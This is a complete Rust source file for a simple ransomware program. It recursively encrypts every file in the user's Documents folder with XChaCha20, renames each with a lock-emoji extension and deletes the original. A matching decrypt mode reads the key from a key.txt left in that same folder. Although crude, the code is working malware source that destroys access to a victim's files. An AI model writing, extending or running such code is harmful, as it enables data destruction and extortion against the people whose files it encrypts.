use std::{fs, path::Path};
use std::path::PathBuf;
use orion::aead::{self, SecretKey};
use dirs::document_dir;
use walkdir::WalkDir;
use text_io::read;

const ENCRYPTED_EXTENSION:	&str	= ".🔒";
const KEY_FILE_NAME:		&str	= "key.txt";

type IDFC<T>		= Result<T, Box<dyn std::error::Error>>;

fn main() -> IDFC<()> {
	let target_dir = document_dir().unwrap();
	let mut keyfile_loc = target_dir.clone();

	keyfile_loc.push(KEY_FILE_NAME);
	let keyfile_loc = keyfile_loc; // make immutable

	fs::File::create(&keyfile_loc)?;
	let canonical_keyfile_path = keyfile_loc.canonicalize()?;

	println!("E___ = encrypt, D___ = decrypt, any else = quit");
	let mode_choice: String = read!();
	let mode_choice_firstchar = mode_choice.chars().nth(0).unwrap().to_lowercase().to_string();
	let mode = match mode_choice_firstchar.as_str() {
		"e"	=> RswareMode::Encrypt,
		"d"	=> RswareMode::Decrypt,
		_	=> RswareMode::Quit,
	};

	if matches!(mode, RswareMode::Quit) {
		// quit early, don't waste time making a WalkDir
		return Ok(())
	};

	let entries = WalkDir::new(target_dir);

	match mode {
		RswareMode::Encrypt	=> {
			let key = SecretKey::default();
			fs::write(keyfile_loc, key.unprotected_as_bytes())?;

			// encrypt shit :P
			for entry in entries {
				let entry = entry?;
				let path = entry.path();
		
				if	path.is_file() &&
					path.canonicalize()? != canonical_keyfile_path {
						
					encrypt_file(path, &key)?;
				}
			}
		},
		
		RswareMode::Decrypt	=> {
			let key = read_keyfile(&keyfile_loc)?;

			// decrypt shit uwu
			for entry in entries {
				let entry = entry?;
				let path = entry.path();
		
				if path.is_file() {
					decrypt_file(path, &key)?;
				}
			}
		},

		RswareMode::Quit	=> {
			unreachable!()
		}
	};

	Ok(())
}

fn encrypt_file(path: &Path, key: &SecretKey) -> IDFC<()> {
	let file_name = path.file_name().unwrap().to_string_lossy();

	// Don't encrypt already encrypted files
	if file_name.ends_with(ENCRYPTED_EXTENSION) {
		return Ok(())
	}

	let encrypted_path = PathBuf::from(
		format!("{}{}", path.display(), ENCRYPTED_EXTENSION)
	);

	// Prepare new file data
	let content = fs::read(&path)?;
	let ciphertext = encrypt_xchacha20(&content[..], &key)?;

	// Write encrypted data to new file
	fs::write(&encrypted_path, &ciphertext[..])?;

	// rm old file
	fs::remove_file(&path)?;

	Ok(())
}

fn decrypt_file(path: &Path, key: &SecretKey) -> IDFC<()> {
	let file_name = path.file_name().unwrap().to_string_lossy();

	// Don't decrypt non-encrypted files
	if !file_name.ends_with(ENCRYPTED_EXTENSION) {
		return Ok(())
	}

	// remove .🔒 from file extension
	let mut decrypted_path = path.to_string_lossy().to_string();
	decrypted_path.truncate(decrypted_path.len() - ENCRYPTED_EXTENSION.len());
	let decrypted_path = decrypted_path;

	dbg!(&file_name, &decrypted_path);

	// Prepare new file data
	let content = fs::read(&path)?;
	let plaintext = decrypt_xchacha20(&content[..], &key)?;

	// Write encrypted data to new file
	fs::write(&decrypted_path, &plaintext[..])?;

	// rm old file
	fs::remove_file(&path)?;

	Ok(())
}

fn encrypt_xchacha20(src: &[u8], key: &SecretKey) -> IDFC<Vec<u8>> {
	let ciphertext = aead::seal(&key, src)?;

	Ok(ciphertext)
}

fn decrypt_xchacha20(src: &[u8], key: &SecretKey) -> IDFC<Vec<u8>> {
	dbg!(&src, &key);

	let decrypted = aead::open(
		&key,
		src
	)?;

	dbg!(&decrypted);

	Ok(decrypted)
}

fn read_keyfile(keyfile: &Path) -> IDFC<SecretKey> {
	let keyfile_data = fs::read(&keyfile)?;
	Ok(SecretKey::from_slice(&keyfile_data[..])?)
}

enum RswareMode {
	Encrypt,
	Decrypt,
	Quit,
}
